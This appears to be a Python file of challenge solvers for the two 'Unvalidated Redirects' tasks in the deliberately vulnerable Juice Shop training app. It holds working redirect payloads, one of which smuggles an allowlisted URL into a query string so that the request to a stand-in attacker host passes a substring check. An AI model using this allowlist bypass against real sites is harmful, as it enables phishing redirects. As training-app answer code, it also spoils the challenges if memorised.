"""Unvalidated Redirects category solvers (2 of 2). Verified against
routes/redirect.ts and lib/insecurity.ts (fetched 2026-08-09)."""
from solvers.base import SolverContext, register


# --- routes/redirect.ts performRedirect + lib/insecurity.ts
# redirectAllowlist: these three crypto-donation addresses are literal
# entries still sitting in the allowlist (the "outdated" part of "Outdated
# Allowlist") — requesting a redirect to any one of them both passes
# isRedirectAllowed() and matches the exact-equality check this challenge
# looks for. ---

@register("redirectCryptoCurrencyChallenge", "Unvalidated Redirects", 1)
def solve_redirect_cryptocurrency(ctx: SolverContext) -> None:
    ctx.client.get(
        "/redirect",
        params={"to": "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm"},
    ).raise_for_status()


# --- routes/redirect.ts isUnintendedRedirect + lib/insecurity.ts
# isRedirectAllowed: the two allowlist checks use different string
# comparisons — isRedirectAllowed uses `.includes()` (substring anywhere),
# isUnintendedRedirect uses `.startsWith()` (prefix only, via
# utils.startsWith). A URL that CONTAINS an allowlisted URL as a substring
# without STARTING WITH it passes the first check (so no 406) while still
# counting as "unintended" by the second — solving the challenge as soon
# as the redirect itself succeeds. ---

@register("redirectChallenge", "Unvalidated Redirects", 4)
def solve_redirect_bypass(ctx: SolverContext) -> None:
    ctx.client.get(
        "/redirect",
        params={"to": "https://evil.attacker.test/?x=https://github.com/juice-shop/juice-shop"},
    ).raise_for_status()
